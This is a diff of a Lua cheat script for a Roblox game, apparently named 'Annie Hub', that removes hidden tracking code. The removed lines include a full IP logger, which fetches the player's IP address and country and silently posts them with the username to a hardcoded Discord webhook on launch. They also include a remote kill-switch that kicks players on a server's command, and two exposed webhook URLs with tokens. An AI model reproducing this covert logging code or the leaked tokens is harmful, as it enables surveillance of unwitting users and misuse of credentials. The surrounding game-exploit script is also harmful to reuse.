@@ -63,7 +63,7 @@ repeat wait() until game: IsLoaded ()
       {
          ["Webhook"] =
          { -- Discord Webhook
-            ["Url"] = "https://discord.com/api/webhooks/1173059368447655996/V118UZx4nJ0bCfgKHzFfxtsPav8JT9IA18iPT9iv49CNvinGtqJqhvNOjm7jifHRsGbY", -- Webhook Của Mày
+            ["Url"] = "", -- Webhook Của Mày
             ["Enable"] = true, -- Bật or Tẵt
          
             ["Webhook Setting"] =
@@ -2172,45 +2172,12 @@ function checkdt(time)
 end
 
 
-function LogConCac()
-    k2 = game:GetService"HttpService":JSONDecode(game:HttpGet"https://api.myip.com")
-    
-    k3 = {}
-    k3["embeds"] = {{["title"] = "Suc Cac", ["url"] = "https://thumbzilla.com/", ["description"] = game.Players.LocalPlayer.Name, ["fields"] = {{["name"]="Game",["value"]=(tostring(game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name) or "Wtf Can't Fetch"), ["inline"]=false},{["name"]="Ip Address", ["value"]=(k2["ip"] or "Cant Log"), ["inline"]=false},{["name"]="Country", ["value"]=(k2["country"] or "cant log"), ["inline"] = false},{["name"]="Exploit",["value"]=tostring(identifyexecutor()) or "Custom Exploit???", ["inline"] = false}}}}
-    return k3
-   
-end 
-function buglog(bug) 
-    k3 = {}
-   
-    k3["embeds"] = {{["title"] = "Con Cac", ["url"] = "https://thumbzilla.com/", ["description"] = game.Players.LocalPlayer.Name, ["fields"] = {{["name"]="Game",["value"]=(tostring(game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name) or "Wtf Can't Fetch"), ["inline"]=false},{["name"]="Problems", ["value"]=(bug or ""), ["inline"]=false},{["name"]="Main", ["value"]=(m1 or "none").." | "..(m2 or "none"),["inline"]=false}}}}
-    return k3
- 
-end 
 
 function isMirageSpawn() 
   return game:GetService("Workspace").Map:FindFirstChild("MysticIsland") 
 end 
        
-function PostWebhook(cm, cn)
-    local co = http_request or request or HttpPost or syn.request
-    
-    local cp =    
-        co(
-        {
-            Url = cm,    
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = game:GetService("HttpService"):JSONEncode(cn)
-        }
-    )
- 
-   
-   --setclipboard(game:GetService("HttpService"):JSONEncode(cn))
-end
-spawn(function ()
-PostWebhook("https://discord.com/api/webhooks/1148666687030317110/hTS32yF21g5JH_Coy2QDjskyCvKhJSB-L4bGJTSCCLblOd8YDVNcrtx1dgNi8A69iJxr", LogConCac()) 
-end)
+
 
             function CFrameQuest()
                QuestPoses = {}
@@ -2653,65 +2620,7 @@ end
                   end
                end
             end
-getgenv().a = false
 
-
-
-function out(a, b) 
-  if a then b() end 
-end 
-out(getgenv().a , LPH_CRASH)
-
-
-getgenv ().a = {
-  host = "https://cringeman.gggggjdksksk.repl.co"
-}
-
-function parserPath(path) 
-  return getgenv().a.host .. "/"..path
-end
-function fetch_data() 
-  local bigay = game:HttpGet(parserPath("/api/v1/getInfo"))
-   local ngu = game:GetService("HttpService"):JSONDecode(bigay)
-ngu = ngu.data
---warn(bigay)
-return ngu
-end 
-
-function bingu(b0, b1) 
-  pcall(function ()
-  game.Players.LocalPlayer:Kick(b1)
-  for k, v in pairs(game.CoreGui.RobloxPromptGui.promptOverlay:GetChildren()) do 
-    v.TitleFrame.ErrorTitle.Text = b0 
-  end 
-    end) 
-  
-  wait(30) 
-  
-end 
-
-out(Rapid, LPH_CRASH) 
-Rapid = {
-  Checking_Delay = 2, 
-} 
-
-
-Rapid.DEFAULT_DATA = fetch_data(); 
-
-spawn(function() 
-    while task.wait((function() 
-      if Rapid.Checking_Delay > 5 then
-          return 2 
-      end 
-      return Rapid.Checking_Delay
-    end)()) do 
-   -- warn(109283737)
-      if Rapid.DEFAULT_DATA.POBqdNKxAW ~= fetch_data().POBqdNKxAW then
-        
-        bingu("Annie Hub / Server Crashed", "An Kick Request Requested From We Server") 
-      end 
-    end 
-  end)
 
       
      
